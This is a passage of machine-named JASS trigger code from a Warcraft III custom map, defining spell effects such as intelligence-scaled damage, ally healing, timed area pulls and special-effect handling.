set W1[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=GetTriggerUnit()
set W2[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=GetSpellTargetUnit()
call TriggerSleepAction(1.)
call UnitDamageTargetBJ(W1[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],W2[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],I2R(GetHeroInt(W1[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],true))*.25*I2R(GetUnitAbilityLevel(W1[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],$41313336))*N0[GetConvertedPlayerId(GetOwningPlayer(W1[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]))],ATTACK_TYPE_NORMAL,DAMAGE_TYPE_NORMAL)
call UnitDamageTargetBJ(W1[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],W2[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],I2R(GetHeroInt(W1[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],true))*.25*I2R(GetUnitAbilityLevel(W1[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],$41305847))*N0[GetConvertedPlayerId(GetOwningPlayer(W1[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]))],ATTACK_TYPE_NORMAL,DAMAGE_TYPE_NORMAL)
set Ub=GetUnitLoc(W2[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))])
set Tq[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=GetUnitsInRangeOfLocMatching(600.,Ub,Condition(function vL))
call ForGroupBJ(Tq[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],function vM)
call RemoveLocation(Ub)
call DestroyGroup(Tq[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))])
call TriggerSleepAction(1.)
call UnitDamageTargetBJ(W1[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],W2[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],I2R(GetHeroInt(W1[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],true))*.25*I2R(GetUnitAbilityLevel(W1[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],$41313336))*N0[GetConvertedPlayerId(GetOwningPlayer(W1[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]))],ATTACK_TYPE_NORMAL,DAMAGE_TYPE_NORMAL)
call UnitDamageTargetBJ(W1[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],W2[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],I2R(GetHeroInt(W1[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],true))*.25*I2R(GetUnitAbilityLevel(W1[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],$41305847))*N0[GetConvertedPlayerId(GetOwningPlayer(W1[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]))],ATTACK_TYPE_NORMAL,DAMAGE_TYPE_NORMAL)
set Ub=GetUnitLoc(W2[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))])
set Tq[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=GetUnitsInRangeOfLocMatching(600.,Ub,Condition(function vN))
call ForGroupBJ(Tq[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],function vO)
call RemoveLocation(Ub)
call DestroyGroup(Tq[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))])
call TriggerSleepAction(1.)
call UnitDamageTargetBJ(W1[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],W2[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],I2R(GetHeroInt(W1[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],true))*.25*I2R(GetUnitAbilityLevel(W1[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],$41313336))*N0[GetConvertedPlayerId(GetOwningPlayer(W1[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]))],ATTACK_TYPE_NORMAL,DAMAGE_TYPE_NORMAL)
call UnitDamageTargetBJ(W1[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],W2[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],I2R(GetHeroInt(W1[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],true))*.25*I2R(GetUnitAbilityLevel(W1[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],$41305847))*N0[GetConvertedPlayerId(GetOwningPlayer(W1[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]))],ATTACK_TYPE_NORMAL,DAMAGE_TYPE_NORMAL)
set Ub=GetUnitLoc(W2[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))])
set Tq[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=GetUnitsInRangeOfLocMatching(600.,Ub,Condition(function vP))
call ForGroupBJ(Tq[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],function vQ)
call RemoveLocation(Ub)
call DestroyGroup(Tq[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))])
call TriggerSleepAction(1.)
call UnitDamageTargetBJ(W1[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],W2[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],I2R(GetHeroInt(W1[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],true))*.25*I2R(GetUnitAbilityLevel(W1[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],$41313336))*N0[GetConvertedPlayerId(GetOwningPlayer(W1[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]))],ATTACK_TYPE_NORMAL,DAMAGE_TYPE_NORMAL)
call UnitDamageTargetBJ(W1[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],W2[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],I2R(GetHeroInt(W1[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],true))*.25*I2R(GetUnitAbilityLevel(W1[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],$41305847))*N0[GetConvertedPlayerId(GetOwningPlayer(W1[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]))],ATTACK_TYPE_NORMAL,DAMAGE_TYPE_NORMAL)
set Ub=GetUnitLoc(W2[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))])
set Tq[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=GetUnitsInRangeOfLocMatching(600.,Ub,Condition(function vR))
call ForGroupBJ(Tq[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],function vS)
call RemoveLocation(Ub)
call DestroyGroup(Tq[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))])
call TriggerSleepAction(1.)
call UnitDamageTargetBJ(W1[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],W2[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],I2R(GetHeroInt(W1[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],true))*.25*I2R(GetUnitAbilityLevel(W1[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],$41313336))*N0[GetConvertedPlayerId(GetOwningPlayer(W1[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]))],ATTACK_TYPE_NORMAL,DAMAGE_TYPE_NORMAL)
call UnitDamageTargetBJ(W1[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],W2[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],I2R(GetHeroInt(W1[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],true))*.25*I2R(GetUnitAbilityLevel(W1[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],$41305847))*N0[GetConvertedPlayerId(GetOwningPlayer(W1[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]))],ATTACK_TYPE_NORMAL,DAMAGE_TYPE_NORMAL)
set Ub=GetUnitLoc(W2[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))])
set Tq[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=GetUnitsInRangeOfLocMatching(600.,Ub,Condition(function vT))
call ForGroupBJ(Tq[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],function vU)
call RemoveLocation(Ub)
call DestroyGroup(Tq[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))])
call TriggerSleepAction(1.)
call UnitDamageTargetBJ(W1[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],W2[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],I2R(GetHeroInt(W1[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],true))*.25*I2R(GetUnitAbilityLevel(W1[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],$41313336))*N0[GetConvertedPlayerId(GetOwningPlayer(W1[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]))],ATTACK_TYPE_NORMAL,DAMAGE_TYPE_NORMAL)
call UnitDamageTargetBJ(W1[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],W2[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],I2R(GetHeroInt(W1[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],true))*.25*I2R(GetUnitAbilityLevel(W1[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],$41305847))*N0[GetConvertedPlayerId(GetOwningPlayer(W1[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]))],ATTACK_TYPE_NORMAL,DAMAGE_TYPE_NORMAL)
set Ub=GetUnitLoc(W2[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))])
set Tq[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=GetUnitsInRangeOfLocMatching(600.,Ub,Condition(function vV))
call ForGroupBJ(Tq[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],function vW)
call RemoveLocation(Ub)
call DestroyGroup(Tq[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))])
call TriggerSleepAction(1.)
call UnitDamageTargetBJ(W1[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],W2[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],I2R(GetHeroInt(W1[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],true))*.25*I2R(GetUnitAbilityLevel(W1[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],$41313336))*N0[GetConvertedPlayerId(GetOwningPlayer(W1[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]))],ATTACK_TYPE_NORMAL,DAMAGE_TYPE_NORMAL)
call UnitDamageTargetBJ(W1[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],W2[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],I2R(GetHeroInt(W1[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],true))*.25*I2R(GetUnitAbilityLevel(W1[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],$41305847))*N0[GetConvertedPlayerId(GetOwningPlayer(W1[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]))],ATTACK_TYPE_NORMAL,DAMAGE_TYPE_NORMAL)
set Ub=GetUnitLoc(W2[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))])
set Tq[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=GetUnitsInRangeOfLocMatching(600.,Ub,Condition(function vX))
call ForGroupBJ(Tq[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],function vY)
call RemoveLocation(Ub)
call DestroyGroup(Tq[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))])
endfunction
function va takes nothing returns nothing
set W0=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(W0,EVENT_PLAYER_UNIT_SPELL_EFFECT)
call TriggerAddCondition(W0,Condition(function vK))
call TriggerAddAction(W0,function vZ)
endfunction
function vb takes nothing returns boolean
if not (GetSpellAbilityId()==$41313333) then
return false
endif
return true
endfunction
function vc takes nothing returns boolean
if not (GetUnitTypeId(GetTriggerUnit())==$4830364E) then
return false
endif
return true
endfunction
function vd takes nothing returns boolean
if not (UnitHasBuffBJ(GetSpellTargetUnit(),$42303749)==true) then
return false
endif
return true
endfunction
function ve takes nothing returns boolean
return IsUnitType(GetFilterUnit(),UNIT_TYPE_HERO)==true
endfunction
function vf takes nothing returns boolean
if not (GetUnitTypeId(GetTriggerUnit())==$4830364E) then
return false
endif
return true
endfunction
function vg takes nothing returns nothing
set SJ[3]=I2R(GetHeroInt(GetTriggerUnit(),true))*I2R(GetUnitAbilityLevel(GetTriggerUnit(),$41313333))
if vd() then
call UnitDamageTargetBJ(GetTriggerUnit(),GetSpellTargetUnit(),SJ[3]*1.*N0[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],ATTACK_TYPE_MAGIC,DAMAGE_TYPE_MAGIC)
if vc() then
call ne(GetTriggerUnit(),"x2",.023,255,70,120)
else
call ne(GetTriggerUnit(),"x2",.023,0,255,255)
endif
else
call UnitDamageTargetBJ(GetTriggerUnit(),GetSpellTargetUnit(),SJ[3]*.5*N0[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],ATTACK_TYPE_MAGIC,DAMAGE_TYPE_MAGIC)
endif
set V0=GetUnitLoc(GetSpellTargetUnit())
set SR=GetUnitsInRangeOfLocMatching(250.,V0,Condition(function ve))
set W4=GroupPickRandomUnit(SR)
call CreateNUnitsAtLoc(1,$68303135,GetOwningPlayer(GetTriggerUnit()),V0,bj_UNIT_FACING)
call IssueTargetOrderBJ(GetLastCreatedUnit(),"innerfire",W4)
call UnitApplyTimedLifeBJ(1.,$42544C46,GetLastCreatedUnit())
call SetUnitLifeBJ(W4,GetUnitState(W4,UNIT_STATE_LIFE)+(200.*I2R(GetUnitAbilityLevel(GetTriggerUnit(),$41313333))+I2R(GetHeroInt(GetTriggerUnit(),true))*1.5)*TQ[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))])
if vf() then
call DestroyEffect(AddSpecialEffectTarget("war3mapImported\\Unleash the powerroz.mdx",W4,"chest"))
else
call DestroyEffect(AddSpecialEffectTarget("war3mapImported\\Unleash the power.mdx",W4,"chest"))
endif
call RemoveLocation(V0)
call DestroyGroup(SR)
set W4=null
endfunction
function vh takes nothing returns nothing
set W3=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(W3,EVENT_PLAYER_UNIT_SPELL_EFFECT)
call TriggerAddCondition(W3,Condition(function vb))
call TriggerAddAction(W3,function vg)
endfunction
function vi takes nothing returns boolean
if not (GetSpellAbilityId()==$41313334) then
return false
endif
return true
endfunction
function vj takes nothing returns boolean
if not (GetUnitTypeId(GetTriggerUnit())==$4830364E) then
return false
endif
return true
endfunction
function vk takes nothing returns boolean
if not (UnitHasBuffBJ(GetSpellTargetUnit(),$42303749)==true) then
return false
endif
return true
endfunction
function vl takes nothing returns boolean
return IsUnitType(GetFilterUnit(),UNIT_TYPE_HERO)==true
endfunction
function vm takes nothing returns boolean
if not (GetUnitTypeId(GetTriggerUnit())==$4830364E) then
return false
endif
return true
endfunction
function vn takes nothing returns nothing
set SJ[3]=I2R(GetHeroInt(GetTriggerUnit(),true))*7.5
if vk() then
call UnitDamageTargetBJ(GetTriggerUnit(),GetSpellTargetUnit(),SJ[3]*2.*N0[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],ATTACK_TYPE_MAGIC,DAMAGE_TYPE_MAGIC)
if vj() then
call ne(GetTriggerUnit(),"x2",.023,255,70,120)
else
call ne(GetTriggerUnit(),"x2",.023,0,255,255)
endif
else
call UnitDamageTargetBJ(GetTriggerUnit(),GetSpellTargetUnit(),SJ[3]*1.*N0[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],ATTACK_TYPE_MAGIC,DAMAGE_TYPE_MAGIC)
endif
set V0=GetUnitLoc(GetSpellTargetUnit())
set SR=GetUnitsInRangeOfLocMatching(250.,V0,Condition(function vl))
set W4=GroupPickRandomUnit(SR)
call CreateNUnitsAtLoc(1,$68303135,GetOwningPlayer(GetTriggerUnit()),V0,bj_UNIT_FACING)
call IssueTargetOrderBJ(GetLastCreatedUnit(),"innerfire",W4)
call UnitApplyTimedLifeBJ(1.,$42544C46,GetLastCreatedUnit())
call SetUnitLifeBJ(W4,GetUnitState(W4,UNIT_STATE_LIFE)+(600.*I2R(GetUnitAbilityLevel(GetTriggerUnit(),$41313334))+I2R(GetHeroInt(GetTriggerUnit(),true))*1.5)*TQ[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))])
if vm() then
call DestroyEffect(AddSpecialEffectTarget("war3mapImported\\Unleash the powerroz.mdx",W4,"chest"))
else
call DestroyEffect(AddSpecialEffectTarget("war3mapImported\\Unleash the power.mdx",W4,"chest"))
endif
call RemoveLocation(V0)
call DestroyGroup(SR)
set W4=null
endfunction
function vo takes nothing returns nothing
set W5=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(W5,EVENT_PLAYER_UNIT_SPELL_EFFECT)
call TriggerAddCondition(W5,Condition(function vi))
call TriggerAddAction(W5,function vn)
endfunction
function vp takes nothing returns boolean
if GetSpellAbilityId()==$41303933 then
return true
endif
if GetSpellAbilityId()==$41305236 then
return true
endif
return false
endfunction
function vq takes nothing returns boolean
return IsUnitAliveBJ(GetFilterUnit())==true
endfunction
function vr takes nothing returns boolean
return IsUnitEnemy(GetFilterUnit(),Player(0))==false
endfunction
function vs takes nothing returns boolean
return GetBooleanAnd(vq(),vr())
endfunction
function vt takes nothing returns nothing
call SetUnitLifeBJ(GetEnumUnit(),GetUnitState(GetEnumUnit(),UNIT_STATE_LIFE)+I2R(GetHeroInt(GetTriggerUnit(),true))*(2.*TQ[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]))
endfunction
function vu takes nothing returns boolean
if not vp() then
return false
endif
return true
endfunction
function vv takes nothing returns boolean
if GetSpellAbilityId()==$4130464E then
return true
endif
if GetSpellAbilityId()==$41305535 then
return true
endif
return false
endfunction
function vw takes nothing returns boolean
return IsUnitAliveBJ(GetFilterUnit())==true
endfunction
function vx takes nothing returns boolean
return IsUnitEnemy(GetFilterUnit(),Player(0))==false
endfunction
function vy takes nothing returns boolean
return GetBooleanAnd(vw(),vx())
endfunction
function vz takes nothing returns nothing
call SetUnitLifeBJ(GetEnumUnit(),GetUnitState(GetEnumUnit(),UNIT_STATE_LIFE)+I2R(GetHeroInt(GetTriggerUnit(),true))*(3.5*TQ[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]))
endfunction
function v0 takes nothing returns boolean
if not vv() then
return false
endif
return true
endfunction
function v1 takes nothing returns boolean
if GetSpellAbilityId()==$41303454 then
return true
endif
if GetSpellAbilityId()==$41304E32 then
return true
endif
return false
endfunction
function v2 takes nothing returns boolean
if not v1() then
return false
endif
return true
endfunction
function v3 takes nothing returns boolean
if GetSpellAbilityId()==$4130464F then
return true
endif
if GetSpellAbilityId()==$41305039 then
return true
endif
return false
endfunction
function v4 takes nothing returns boolean
if not v3() then
return false
endif
return true
endfunction
function v5 takes nothing returns boolean
if not (GetUnitTypeId(GetTriggerUnit())==$68303542) then
return false
endif
return true
endfunction
function v6 takes nothing returns nothing
if vu() then
set W7[9]=GetUnitLoc(GetTriggerUnit())
set SR=GetUnitsInRangeOfLocMatching(800.,W7[9],Condition(function vs))
call ForGroupBJ(SR,function vt)
call RemoveLocation(W7[9])
call DestroyGroup(SR)
else
endif
if v0() then
set W7[9]=GetUnitLoc(GetTriggerUnit())
set SR=GetUnitsInRangeOfLocMatching(800.,W7[9],Condition(function vy))
call ForGroupBJ(SR,function vz)
call RemoveLocation(W7[9])
call DestroyGroup(SR)
else
endif
if v2() then
set SJ[3]=I2R(GetHeroInt(GetTriggerUnit(),true))*3.
call SetUnitLifeBJ(GetSpellTargetUnit(),GetUnitStateSwap(UNIT_STATE_LIFE,GetSpellTargetUnit())+SJ[3]*TQ[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))])
set SJ[3]=0.
else
endif
if v4() then
set SJ[3]=I2R(GetHeroInt(GetTriggerUnit(),true))*4.5
call SetUnitLifeBJ(GetSpellTargetUnit(),GetUnitStateSwap(UNIT_STATE_LIFE,GetSpellTargetUnit())+SJ[3]*TQ[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))])
set SJ[3]=0.
else
endif
if v5() then
call KillUnit(GetTriggerUnit())
else
endif
endfunction
function v7 takes nothing returns nothing
set W6=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(W6,EVENT_PLAYER_UNIT_SPELL_EFFECT)
call TriggerAddAction(W6,function v6)
endfunction
function v8 takes nothing returns boolean
return IsUnitAlly(GetFilterUnit(),Player(0))==true
endfunction
function v9 takes nothing returns nothing
call SetUnitLifeBJ(GetEnumUnit(),GetUnitState(GetEnumUnit(),UNIT_STATE_LIFE)+(GetUnitState(GetTriggerUnit(),UNIT_STATE_MAX_LIFE)+GetUnitState(MT[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))-1],UNIT_STATE_MAX_MANA)/2.))
call AddSpecialEffectLocBJ(Ub,"war3mapImported\\EnergyBurst.mdl")
call DestroyEffect(GetLastCreatedEffectBJ())
endfunction
function wB takes nothing returns boolean
if not (GetUnitTypeId(GetTriggerUnit())==$68303542) then
return false
endif
return true
endfunction
function wC takes nothing returns boolean
if GetUnitTypeId(GetDyingUnit())==$6E303152 then
return true
endif
if GetUnitTypeId(GetDyingUnit())==$6E303150 then
return true
endif
if GetUnitTypeId(GetDyingUnit())==$6E303151 then
return true
endif
if GetUnitTypeId(GetDyingUnit())==$6E30314F then
return true
endif
if GetUnitTypeId(GetDyingUnit())==$6E30314E then
return true
endif
return false
endfunction
function wD takes nothing returns boolean
if not wC() then
return false
endif
return true
endfunction
function wE takes nothing returns nothing
if wB() then
set Ub=GetUnitLoc(GetTriggerUnit())
set SR=GetUnitsInRangeOfLocMatching(1000.,Ub,Condition(function v8))
call ForGroupBJ(SR,function v9)
call RemoveLocation(Ub)
call DestroyGroup(SR)
call RemoveUnit(GetTriggerUnit())
else
endif
if wD() then
call RemoveUnit(GetDyingUnit())
else
endif
endfunction
function wF takes nothing returns nothing
set W8=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(W8,EVENT_PLAYER_UNIT_DEATH)
call TriggerAddAction(W8,function wE)
endfunction
function wG takes nothing returns nothing
local unit Hu=GetEnumUnit()
local unit NQ
call UnitDamageTarget(Pq,Hu,Nu,true,false,ATTACK_TYPE_HERO,DAMAGE_TYPE_NORMAL,WEAPON_TYPE_WHOKNOWS)
set NQ=CreateUnitAtLoc(Player(0),$68303739,Pr,0)
call nD(NQ,1)
call UnitAddAbility(NQ,$4131324E)
call IssueTargetOrder(NQ,"creepthunderbolt",Hu)
set NQ=null
set Hu=null
endfunction
function wH takes nothing returns nothing
local unit Hu=LoadUnitHandle(PP,GetHandleId(GetExpiredTimer()),0)
local location Mc
local group No
local boolexpr Np
call SaveInteger(PP,GetHandleId(GetExpiredTimer()),3,LoadInteger(PP,GetHandleId(GetExpiredTimer()),3)-1)
if LoadInteger(PP,GetHandleId(GetExpiredTimer()),3)>=1 then
if not (GetUnitAbilityLevel(Hu,$4230384F)>0) then
set Mc=GetUnitLoc(Hu)
set No=CreateGroup()
set Np=Condition(function mx)
call GroupEnumUnitsInRange(No,GetLocationX(Mc),GetLocationY(Mc),500,Np)
call DestroyBoolExpr(Np)
set Nu=LoadInteger(PP,GetHandleId(GetExpiredTimer()),4)
set Pq=Hu
call ForGroup(No,function wG)
call DestroyGroup(No)
call RemoveLocation(Mc)
set Mc=null
set Np=null
set No=null
call RemoveSavedHandle(PP,GetHandleId(GetExpiredTimer()),0)
call RemoveSavedInteger(PP,GetHandleId(GetExpiredTimer()),3)
call RemoveSavedInteger(PP,GetHandleId(GetExpiredTimer()),4)
call PauseTimer(GetExpiredTimer())
call DestroyTimer(GetExpiredTimer())
endif
else
set Mc=GetUnitLoc(Hu)
set No=CreateGroup()
set Np=Condition(function mx)
call GroupEnumUnitsInRange(No,GetLocationX(Mc),GetLocationY(Mc),500,Np)
call DestroyBoolExpr(Np)
set Nu=LoadInteger(PP,GetHandleId(GetExpiredTimer()),4)
set Pq=Hu
call ForGroup(No,function wG)
call DestroyGroup(No)
call RemoveLocation(Mc)
set Mc=null
set Np=null
set No=null
call RemoveSavedHandle(PP,GetHandleId(GetExpiredTimer()),0)
call RemoveSavedInteger(PP,GetHandleId(GetExpiredTimer()),3)
call RemoveSavedInteger(PP,GetHandleId(GetExpiredTimer()),4)
call PauseTimer(GetExpiredTimer())
call DestroyTimer(GetExpiredTimer())
endif
set Hu=null
endfunction
function wI takes nothing returns nothing
local unit Hu=GetEnumUnit()
local real MD=GetLocationX(Pr)
local real ME=GetLocationY(Pr)
local real Pt=GetUnitX(Hu)
local real Pu=GetUnitY(Hu)
local real NT=Atan2(ME-Pu,MD-Pt)
local real Pw=nR(GetUnitX(Hu)+10*Cos(NT))
local real Px=nS(GetUnitY(Hu)+10*Sin(NT))
local location Ht=Location(Pw,Px)
local unit Mc
call SetUnitPositionLoc(Hu,Ht)
if nT(Pr,Location(Pt,Pu))<=85 and GetUnitAbilityLevel(Hu,$42303639)<1 then
call UnitDamageTarget(Pq,Hu,GetHeroStr(Pq,true)*7*Ng[GetPlayerId(GetOwningPlayer(Pq))+1],true,false,ATTACK_TYPE_HERO,DAMAGE_TYPE_NORMAL,WEAPON_TYPE_WHOKNOWS)
set Mc=CreateUnitAtLoc(Player(0),$68303739,Pr,0)
call nD(Mc,1)
call UnitAddAbility(Mc,$4131324E)
call SetUnitAbilityLevel(Mc,$4131324E,2)
call IssueTargetOrder(Mc,"creepthunderbolt",Hu)
set Mc=null
endif
call RemoveLocation(Ht)
set Ht=null
set Hu=null
endfunction
function wJ takes nothing returns nothing
local unit Hu=LoadUnitHandle(PP,GetHandleId(GetExpiredTimer()),0)
local group Na
set Pr=LoadLocationHandle(PP,GetHandleId(GetExpiredTimer()),1)
set Na=LoadGroupHandle(PP,GetHandleId(GetExpiredTimer()),2)
call SaveInteger(PP,GetHandleId(GetExpiredTimer()),3,LoadInteger(PP,GetHandleId(GetExpiredTimer()),3)-1)
if LoadInteger(PP,GetHandleId(GetExpiredTimer()),3)>=1 then
set Pq=Hu
call ForGroup(Na,function wI)
else
call RemoveLocation(LoadLocationHandle(PP,GetHandleId(GetExpiredTimer()),1))
call DestroyGroup(LoadGroupHandle(PP,GetHandleId(GetExpiredTimer()),2))
call DestroyEffect(LoadEffectHandle(PP,GetHandleId(GetExpiredTimer()),4))
call RemoveSavedHandle(PP,GetHandleId(GetExpiredTimer()),0)
call RemoveSavedHandle(PP,GetHandleId(GetExpiredTimer()),4)
call RemoveSavedInteger(PP,GetHandleId(GetExpiredTimer()),3)
call PauseTimer(GetExpiredTimer())
call DestroyTimer(GetExpiredTimer())
endif
set Hu=null
set Na=null
endfunction
function wK takes nothing returns nothing
local unit Hu=GetTriggerUnit()
local integer Ma=GetPlayerId(GetOwningPlayer(Hu))
local timer Hc
local integer Mc
local location No
local group Np
local boolexpr Nt
local unit Ny
local real Ot
if GetSpellAbilityId()==$41304C32 then
set Po[Ma]=R2I((GetUnitState(Hu,UNIT_STATE_MAX_LIFE)/3+2000)*I2R(GetUnitAbilityLevel(Hu,$41304C32))*Nf[GetPlayerId(GetOwningPlayer(Hu))+1])
set Pp[Ma]=true
set Hc=CreateTimer()
call SaveUnitHandle(PP,GetHandleId(Hc),0,Hu)
call SaveInteger(PP,GetHandleId(Hc),3,21)
call SaveInteger(PP,GetHandleId(Hc),4,Po[Ma])
call TimerStart(Hc,.5,true,function wH)
set Hc=null
elseif GetSpellAbilityId()==$41304B5A then
set Po[Ma]=R2I((GetUnitState(Hu,UNIT_STATE_MAX_LIFE)*1.5+6000)*Nf[GetPlayerId(GetOwningPlayer(Hu))+1])
set Pp[Ma]=true
set Hc=CreateTimer()
call SaveUnitHandle(PP,GetHandleId(Hc),0,Hu)
call SaveInteger(PP,GetHandleId(Hc),3,21)
call SaveInteger(PP,GetHandleId(Hc),4,Po[Ma])
call TimerStart(Hc,.5,true,function wH)
set Hc=null
elseif GetSpellAbilityId()==$41303842 then
set Mc=GetUnitAbilityLevel(Hu,$4130364B)
call UnitRemoveAbility(Hu,$4130364B)
call UnitAddAbility(Hu,$4130364B)
call SetUnitAbilityLevel(Hu,$4130364B,Mc)
set No=GetUnitLoc(Hu)
set Np=CreateGroup()
set Nt=Condition(function mx)
call GroupEnumUnitsInRange(Np,GetLocationX(No),GetLocationY(No),600,Nt)
call DestroyBoolExpr(Nt)
set Nu=GetUnitAbilityLevel(Hu,$41303842)*2000+GetHeroStr(Hu,true)*7
set Pq=Hu
call ForGroup(Np,function m8)
set Hc=CreateTimer()
call SaveUnitHandle(PP,GetHandleId(Hc),0,Hu)
call SaveLocationHandle(PP,GetHandleId(Hc),1,No)
call SaveGroupHandle(PP,GetHandleId(Hc),2,Np)
call SaveInteger(PP,GetHandleId(Hc),3,50)
call SaveEffectHandle(PP,GetHandleId(Hc),4,AddSpecialEffectLoc("war3mapImported\\Kingdom Come.mdx",No))
